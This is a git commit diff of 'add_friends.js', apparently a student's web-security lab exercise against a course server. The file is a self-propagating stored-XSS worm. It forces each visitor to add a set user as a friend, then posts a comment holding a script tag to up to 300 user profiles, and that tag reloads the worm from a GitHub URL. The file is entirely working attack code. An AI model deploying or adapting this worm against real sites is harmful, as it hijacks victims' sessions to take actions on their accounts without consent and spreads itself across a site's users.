e294a4d4a738802c17b8bfe322f9907f4e560f3a
ajm4098 <60370557+ajm4098@users.noreply.github.com>
2022-04-06 14:41:15 -0400

    Update add_friends.js

--- add_friends.js
+++ add_friends.js
@@ -1,9 +1,12 @@
-  var cookie = new URLSearchParams(document.cookie.replaceAll("; ","&"));
+//A.J. Musacchio
+var cookie = new URLSearchParams(document.cookie.replaceAll("; ","&"));
+//check if cookie is there
 if(cookie.get("choc") != "chocolate") {
     var add = new XMLHttpRequest();
     add.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=90`, true);
 	add.send();
-    for (var i = 0; i < 151; i++) {
+// loop to all users
+    for (var i = 0; i < 300; i++) {
         var post = new XMLHttpRequest();
         post.open("POST", `/add_comment.php?id=${i}&comment=<script src="https://github.com/ajm4098/webapp6/edit/main/add_friends.js"></script>`, true);
         post.send();
